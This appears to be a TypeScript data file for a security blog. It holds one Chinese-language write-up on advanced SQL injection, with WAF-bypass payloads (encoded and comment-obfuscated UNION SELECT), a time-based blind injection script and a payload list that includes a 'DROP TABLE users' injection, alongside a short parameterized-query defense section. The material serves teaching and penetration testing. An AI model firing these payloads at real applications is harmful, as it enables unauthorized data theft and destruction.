import type { WriteUp } from "../writeups-data"
import { TAG_COLORS } from "../writeups-data"

export const advancedSqlInjectionWriteUp: WriteUp = {
  id: "advanced-sql-injection-2024",
  title: "Advanced SQL Injection in Modern Web Applications",
  slug: "advanced-sql-injection",
  category: "Web Security",
  difficulty: "Expert",
  status: "Featured",
  publishedDate: "2024-01-15",
  lastUpdated: "2024-01-20",
  description:
    "深入分析現代 Web 應用程式中的高級 SQL 注入技術，包括 WAF 繞過、盲注技巧和自動化工具開發。探討最新的防護機制和攻擊向量，並提供實戰案例分析。",
  tags: [
    { name: "SQL Injection", color: TAG_COLORS["SQL Injection"] },
    { name: "WAF Bypass", color: TAG_COLORS["WAF Bypass"] },
    { name: "Web Security", color: TAG_COLORS["Web Security"] },
    { name: "Penetration Testing", color: TAG_COLORS["Penetration Testing"] },
  ],
  readTime: "15 min",
  metrics: {
    views: "0",
    likes: "0",
    shares: "0",
    comments: "0",
  },
  author: {
    name: "Syan",
    bio: "Red Team Exercise & Developer",
    social: {
      github: "https://github.com/syan-quantum",
      twitter: "https://twitter.com/syan_quantum",
    },
  },
  content: {
    summary: "本文深入探討現代 Web 應用程式中的高級 SQL 注入技術，涵蓋 WAF 繞過、盲注技巧和自動化工具開發。",
    tableOfContents: ["現代 WAF 繞過技術", "盲注自動化技術", "防護機制分析", "實戰案例研究", "工具開發指南"],
    content: `
# Advanced SQL Injection in Modern Web Applications

## 摘要

本文深入探討現代 Web 應用程式中的高級 SQL 注入技術，包括 WAF 繞過、盲注技巧和自動化工具開發。

## 1. 現代 WAF 繞過技術

### 1.1 編碼繞過
\`\`\`sql
-- URL 編碼繞過
%27%20UNION%20SELECT%20*%20FROM%20users--

-- 雙重編碼
%2527%2520UNION%2520SELECT%2520*%2520FROM%2520users--

-- Unicode 編碼
\\u0027\\u0020UNION\\u0020SELECT\\u0020*\\u0020FROM\\u0020users--
\`\`\`

### 1.2 註釋繞過
\`\`\`sql
-- MySQL 註釋繞過
/*!50000UNION*/ /*!50000SELECT*/ * FROM users

-- 內聯註釋
/*! UNION */ /*! SELECT */ * FROM users

-- 版本特定註釋
/*!50001 AND 1=1*/
\`\`\`

## 2. 盲注自動化技術

### 2.1 時間盲注
\`\`\`python
import requests
import time

def time_based_sqli(url, payload):
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()
    
    return (end_time - start_time) > 5

# 測試 payload
payload = "' AND IF(1=1, SLEEP(5), 0)--"
if time_based_sqli(target_url, payload):
    print("SQL Injection 漏洞確認")
\`\`\`

## 3. 防護機制

### 3.1 參數化查詢
\`\`\`python
# 正確的參數化查詢
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))

# 錯誤的字符串拼接
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
\`\`\`

## 4. 總結

現代 SQL 注入攻擊變得越來越複雜，需要多層防護策略。
    `,
    codeExamples: [
      {
        language: "sql",
        code: "SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admin_users--",
        description: "基本 UNION 注入示例",
      },
      {
        language: "python",
        code: `
import requests

def test_sql_injection(url, param):
    payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--"]
    for payload in payloads:
        response = requests.get(f"{url}?{param}={payload}")
        if "error" in response.text.lower():
            return True
    return False
        `,
        description: "自動化 SQL 注入檢測腳本",
      },
    ],
    references: [
      {
        title: "OWASP SQL Injection Prevention Cheat Sheet",
        url: "https://owasp.org/www-community/attacks/SQL_Injection",
        type: "documentation",
      },
      {
        title: "Advanced SQL Injection Techniques",
        url: "https://example.com/advanced-sqli",
        type: "article",
      },
    ],
  },
  featured: true,
  prerequisites: ["基礎 SQL 知識", "Web 應用程式架構", "HTTP 協議"],
  relatedWriteups: ["quantum-cryptography-implementation"],
}
